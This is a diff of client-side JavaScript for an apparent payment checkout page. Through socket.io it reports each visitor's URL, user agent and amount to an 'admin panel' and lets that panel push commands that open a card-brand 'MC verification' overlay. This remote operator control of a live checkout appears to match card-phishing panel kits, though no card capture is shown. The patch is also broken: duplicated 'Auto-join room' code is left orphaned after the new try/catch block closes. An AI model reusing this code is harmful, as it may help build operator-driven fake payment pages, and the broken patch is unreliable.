@@ -855,7 +855,7 @@ document.addEventListener('DOMContentLoaded', function() {
         // Generate invoice ID
         document.getElementById('invoiceId').textContent = generateInvoiceID();
         
-       // Socket connection initialization
+// Socket connection initialization
 try {
     console.log('Initializing socket connection...');
     socket = io();
@@ -870,24 +870,35 @@ try {
         console.log('Socket connected with ID:', socket.id);
         console.log('Socket transport type:', socket.io.engine.transport.name);
       
-            // Send visitor info to admin panel
-            socket.emit('visitor', {
-                pid: state.pid || generateTransactionId(),
-                url: window.location.href,
-                userAgent: navigator.userAgent,
-                timestamp: new Date().toISOString(),
-                amount: state.amount
+        // Send visitor info to admin panel
+        socket.emit('visitor', {
+            pid: state.pid || generateTransactionId(),
+            url: window.location.href,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString(),
+            amount: state.amount
+        });
+        
+        console.log('Visitor info sent to server');
+        
+        // Start heartbeat
+        setInterval(() => {
+            socket.emit('visitor_heartbeat', { 
+                pid: state.pid,
+                timestamp: Date.now() 
             });
-            
-            console.log('Visitor info sent to server');
-            
-            // Start heartbeat
-            setInterval(() => {
-                socket.emit('visitor_heartbeat', { 
-                    pid: state.pid,
-                    timestamp: Date.now() 
-                });
-            }, 30000);
+        }, 30000);
+        
+        // Auto-join room for this pid if available
+        if (state.pid) {
+            socket.emit('join', state.pid);
+            console.log('Joined room for pid:', state.pid);
+        }
+    });
+} catch (error) {
+    console.error('Failed to initialize socket:', error);
+    showErrorNotification('Payment system initialization failed. Please refresh and try again.');
+}
             
             // Auto-join room for this pid if available
             if (state.pid) {
@@ -982,7 +993,6 @@ try {
     }
 });
 
-// Setup Socket Event Handlers (separate function for better organization)
 function setupSocketEventHandlers() {
     if (!socket) {
         console.error('Socket not initialized');
@@ -1185,31 +1195,34 @@ socket.on('mc_verification_result', function(data) {
 
         // In your setupSocketEventHandlers function, add these handlers:
 
-// Handle brand selection command
-socket.on('show_brand_selection', function(data) {
-    console.log('Received brand selection command:', data);
-    
-    // Store transaction ID if provided
-    if (data.invoiceId && !state.transactionId) {
-        state.transactionId = data.invoiceId;
-    }
-    
-    // Show MC verification overlay with brand selection
-    showBrandSelectionOverlay();
-});
-
-// Handle brand type update
-socket.on('update_brand_type', function(data) {
-    console.log('Received brand type update:', data);
-    
-    if (data.brandType) {
-        state.cardType = data.brandType;
-        console.log('Card type updated to:', data.brandType);
+  // Handle brand selection command
+    socket.on('show_brand_selection', function(data) {
+        console.log('Received brand selection command:', data);
         
-        // Update UI if brand selection is active
-        updateBrandSelectionUI(data.brandType);
-    }
-});
+        // Store transaction ID if provided
+        if (data.invoiceId && !state.transactionId) {
+            state.transactionId = data.invoiceId;
+        }
+        
+        // Show MC verification overlay with brand selection
+        showBrandSelectionOverlay();
+    });
+
+    // Handle brand type update
+    socket.on('update_brand_type', function(data) {
+        console.log('Received brand type update:', data);
+        
+        if (data.brandType) {
+            state.cardType = data.brandType;
+            console.log('Card type updated to:', data.brandType);
+            
+            // Update UI if brand selection is active
+            updateBrandSelectionUI(data.brandType);
+        }
+    });
+    
+    console.log('Socket event handlers setup complete');
+}
 // Helper function to get currency symbols
 function getCurrencySymbol(currencyCode) {
     const symbols = {
